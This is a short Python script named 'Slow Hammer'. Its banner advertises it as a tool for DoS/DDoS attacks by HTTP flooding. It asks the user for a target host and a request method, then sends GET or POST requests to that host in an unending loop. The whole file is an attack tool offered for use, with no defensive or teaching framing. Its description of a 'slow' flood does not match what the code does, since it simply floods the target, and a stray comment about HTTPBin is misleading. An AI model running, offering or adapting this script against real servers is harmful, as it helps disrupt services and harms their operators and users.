import requests
import os
import socket
import threading
import time
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime
from optparse import OptionParser
from os import urandom as randbytes
from typing import List
print('____________________________________________________________')
print('|                      Python script                       |')
print('|                                                          |')
print('|   .oOo.------------.[ Slow Hammer ].------------.oOo.    |')
print('|                                                          |')
print('|       Slow Hammer created for DoS/DDoS attacks           |')
print('|                                                          |')
print('| Note: this script attacks with a slow HTTP flood method  |')
print('|                                                          |')
print('|         Example: www.example.com / example.com           |')
print('|                                                          |')
print('|   .oOo.------------.[ Slow Hammer ].------------.oOo.    |')
print('|__________________________________________________________|')
headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
#Lets test what headers are sent by sending a request to HTTPBin
ip = input('Please enter a target:')
method = input('Enter type of requests (POST, GET):')
if method not in ('GET', 'POST', 'get', 'post'):
    print("[!] Wrong type of request [!]\n")
elif method == 'GET':
        while True: requests.get(url=f'https://{ip}',headers=headers), print('[!] HTTP packet send with GET method [!]')
elif method == 'get':
        while True: requests.get(url=f'https://{ip}', headers=headers), print('[!] HTTP packet send with GET method [!]')

elif method == 'POST':
        while True: requests.post(url=f'https://{ip}',headers=headers,data={'Content-Length':'post'}), print('[!] HTTP packet send with POST method [!]')

elif method == 'post':
        while True: requests.post(url=f'https://{ip}',headers=headers,data={'Content-Length':'post'}), print('[!] HTTP packet send with POST method [!]')

#Slow Hammer
